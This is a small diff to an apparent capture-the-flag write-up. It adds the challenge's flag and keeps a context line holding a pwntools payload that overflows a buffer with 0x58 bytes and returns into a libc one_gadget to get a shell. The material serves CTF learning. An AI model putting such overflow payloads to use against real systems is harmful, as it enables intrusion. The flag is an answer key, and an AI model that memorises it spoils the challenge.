@@ -77,6 +77,5 @@ We have a one_gadget at ```0x448a3``` offset, we can just return to that with an
 p.sendline(0x58*b"C" + p64(libc.address + one_shot_offset) + b"\x00"*0x100) 
 ```
 
-
-
-
+#### Flag
+```flag{0h_nO_My_G0t!!!!1111!1!}```
